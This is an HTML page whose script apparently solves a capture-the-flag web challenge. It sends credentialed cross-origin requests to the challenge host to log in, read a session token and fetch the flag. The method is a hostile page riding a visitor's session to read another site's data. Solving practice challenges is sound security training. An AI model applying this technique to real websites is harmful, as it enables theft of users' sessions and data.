<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Community Accounts Demo</title>
  <style>
    body { font-family: system-ui,Segoe UI,Roboto,Arial; margin: 2rem; }
    pre { background: #f0f0f0; padding: 1rem; }
    button { margin-top: 1rem; padding: 0.5rem 1rem; font-size: 1rem; }
  </style>
</head>
<body>
  <h1>Community Accounts Demo</h1>
  <p>Click the button to login, get your token, and fetch the flag.</p>
  <button id="start">Run</button>
  <pre id="out"></pre>

  <script>
    const out = document.getElementById('out');
    const log = (x) => out.textContent += x + "\n";

    async function call(path, init) {
      const res = await fetch(path, Object.assign({ credentials: 'include' }, init || {}));
      const text = await res.text();
      return { status: res.status, text, json: () => JSON.parse(text) };
    }

    async function run() {
      log("Starting...");

      // 1️⃣ Login
      const loginRes = await call('https://web200-1.pointeroverflowctf.com/login', { method: 'POST' });
      log(`Login: ${loginRes.status} ${loginRes.text}`);

      // 2️⃣ Get session token
      const tokenRes = await call('https://web200-1.pointeroverflowctf.com/api/token');
      log(`Token response: ${tokenRes.status} ${tokenRes.text}`);
      
      let token;
      try {
        token = tokenRes.json().token; // assuming API returns { "token": "..." }
      } catch {
        log("Failed to parse token. Check login first.");
        return;
      }

      log(`Token: ${token}`);

      // 3️⃣ Fetch flag using token
      const flagRes = await fetch('https://web200-1.pointeroverflowctf.com/api/flag', {
        method: 'GET',
        headers: { 'X-Flag-Token': token },
        credentials: 'include'
      });

      const flagText = await flagRes.text();
      log(`Flag: ${flagText}`);
    }

    document.getElementById('start').onclick = run;
  </script>
</body>
</html>
